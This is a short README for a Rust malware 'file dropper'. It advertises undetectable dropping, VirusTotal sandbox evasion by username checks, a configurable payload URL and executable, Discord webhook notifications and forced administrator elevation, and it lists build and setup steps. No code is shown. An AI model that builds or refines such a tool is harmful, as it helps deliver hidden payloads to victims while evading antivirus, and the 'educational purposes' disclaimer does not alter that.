# Rust File Dropper

## Features
- FUD Dropping
- Basic Virustotal Anti-Scanner (usernames)
- Custom EXE
- Custom Webhook
- Discord Webhook Notifications

## How to setup
1. Change the URL, Webhook and file name in main.rs
2. Run `cargo build --release` to build the file.
3. Move the built exe from `./target/release` into `./manifest_change`.
4. Execute the command in `change.txt`
5. The exe should require administrator permissions to open now.

## Legal
I the creator of this software, have no responsibility for what you do with said software. This software is for testing and educational purposes ONLY.
